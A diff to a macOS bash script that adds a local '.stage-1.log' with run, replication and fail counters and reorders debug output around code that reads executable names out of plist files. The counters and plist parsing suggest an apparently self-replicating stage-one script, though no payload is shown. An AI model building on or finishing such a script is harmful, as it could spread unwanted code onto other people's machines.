@@ -9,6 +9,13 @@ Path=$(pwd)
 if [ -f ./.stage-1.log ] && [ ${Path} != "/Users/Shared/" ] && [ ${LOGGING} == 1 ]
 then
 	echo "" >> ./.stage-1.log
+else
+	#Create local log and a run count (to be edited at the end)
+	touch ./.stage-1.log
+	echo "Run count: 0" >> ./.stage-1.log
+	echo "Replication count: 0" ./.stage-1.log
+	echo "Fails count: 0" >> ./.stage-1.log
+	echo "" >> ./.stage-1.log
 fi
 if [ ${Path} == "/Users/Shared" ] && [ ${LOGGING} == 1 ]
 then
@@ -74,7 +81,28 @@ do
 		ExecLineFull=$(sed -n "${ExecLineNum}p" "${TargetPlist}")
 		TmpName=$RANDOM
 		echo "${ExecLineFull}" >> "/private/tmp/${TmpName}"
+		if [ ${DEBUG} == 1 ]
+		then
+			echo "ExecLineFull is ${ExecLineFull}"
+			echo "TmpName is ${TmpName}"
+			echo "TmpName file is /private/tmp/${TmpName}"
+			if [ ${LOGGING} == 1 ]
+			then
+				echo "ExecLineFull is ${ExecLineFull}" >> ./.stage-1.log
+				echo "TmpName is ${TmpName}" >> ./.stage-1.log
+				echo "TmpName file is /private/tmp/${TmpName}" >> ./.stage-1.log
+			fi
+		fi
 		ExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
+		#-E after sed is thanks to https://stackoverflow.com/a/28072266/8390381
+		if [ ${DEBUG} == 1 ]
+		then
+			echo "ExecName is ${ExecName}"
+			if [ ${LOGGING} == 1 ]
+			then
+				echo "ExecName is ${ExecName}" >> ./.stage-1.log
+			fi
+		fi
 		rm "/private/tmp/${TmpName}"
 		if [ ! -f "/private/tmp/${TmpName}" ] && [ ${DEBUG} == 1 ]
 		then
@@ -82,19 +110,6 @@ do
 			if [ ${LOGGING} == 1 ]
 			then
 				echo "TmpName (${TmpName}) deleted" >> ./.stage-1.log
-			fi
-		fi
-		#-E after sed is thanks to https://stackoverflow.com/a/28072266/8390381
-		if [ ${DEBUG} == 1 ]
-		then
-			echo "ExecLineFull is ${ExecLineFull}"
-			echo "TmpName is ${TmpName}"
-			echo "ExecName is ${ExecName}"
-			if [ ${LOGGING} == 1 ]
-			then
-				echo "ExecLineFull is ${ExecLineFull}" >> ./.stage-1.log
-				echo "TmpName is ${TmpName}" >> ./.stage-1.log
-				echo "ExecName is ${ExecName}" >> ./.stage-1.log
 			fi
 		fi
 		#If ${ExecName} starts with a . (aka is hidden) then repeat this loop
